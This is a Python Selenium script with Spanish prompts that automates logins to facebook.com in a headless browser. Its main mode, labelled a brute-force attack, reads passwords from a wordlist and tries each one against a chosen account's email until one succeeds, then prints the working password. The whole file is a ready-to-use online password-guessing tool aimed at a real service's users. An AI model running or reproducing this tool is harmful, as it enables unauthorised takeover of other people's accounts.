import time, sys, os
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service as FirefoxService

init(autoreset=True)

WHITE=f'{Fore.WHITE}{Style.BRIGHT}'
GREEN=f'{Fore.GREEN}{Style.BRIGHT}'
RED=f'{Fore.RED}{Style.BRIGHT}'


geckodriver_path = "..\\geckodriver.exe"
social_network = "https://www.facebook.com"

def print1(mensaje):
 for letra in mensaje:
  sys.stdout.write(letra)
  sys.stdout.flush()
  time.sleep(0.02)

print1(f'[*] ABRIENDO {social_network}')
print("\n")

options = Options()
options.add_argument("--headless")
service = FirefoxService(executable_path=geckodriver_path, options=options)
driver = webdriver.Firefox(service=service, options=options)
driver.get(social_network)
time.sleep(2)

def send(user_name, password):
 element = driver.find_element(By.ID, "email")
 element.send_keys(user_name)
 element = driver.find_element(By.ID, "pass")
 element.send_keys(password)
 element.send_keys(Keys.RETURN)
 time.sleep(15)
 page = driver.page_source
 line_count = len(page.splitlines())
 if line_count < 35:
  return False
 else:
  return True

def word(wordlist):
 n=1
 with open(wordlist, 'r') as f:
  v=f.readlines()
  for i in v:
   password = i.replace('\n', '')
   state = send(user_name, password)
   if state == True:
    print(f"{WHITE}[{n}]{GREEN} CLAVE EXITOSA => {password}")
    input()
    driver.close()
    sys.exit()
   else:
    print(f"{WHITE}[{n}]{RED} CLAVE INCORRECTA => {password}")
    driver.back()
   n=n+1

print('''
[1] INGRESAR A CUENTA DE FACEBOOK (NOT WORDLIST)
[2] ATAQUE DE FUERZA BRUTA (WORDLIST)
''')

opc = input('OPCION => ')
print("")

if opc == '1':
 user_name = input('INTRODUZCA EL CORREO -> ')
 password = input('CLAVE DE ACCESO -> ')
 print(f'\n{WHITE}INICIANDO ATAQUE A CUENTA = {GREEN}{user_name}... \n')
 state = send(user_name, password)
 if state == True:
  print(f"{WHITE}[*]{GREEN} CLAVE EXITOSA => {password}")
  input()
  driver.close()
  sys.exit()
 else:
  print(f"{WHITE}[{n}]{RED} CLAVE INCORRECTA => {password}")
  driver.back()
elif opc == '2':
 user_name = input('INTRODUZCA EL CORREO -> ')
 wordlist = input('NOMBRE DEL DICCIONARIO -> ')
 print(f'\n{WHITE}INICIANDO ATAQUE A CUENTA = {GREEN}{user_name}... \n')
 word(wordlist)
else:
 print(f"\n{RED}OPCION INVALIDA ... ")
 time.sleep(3)
 sys.exit()
driver.close()

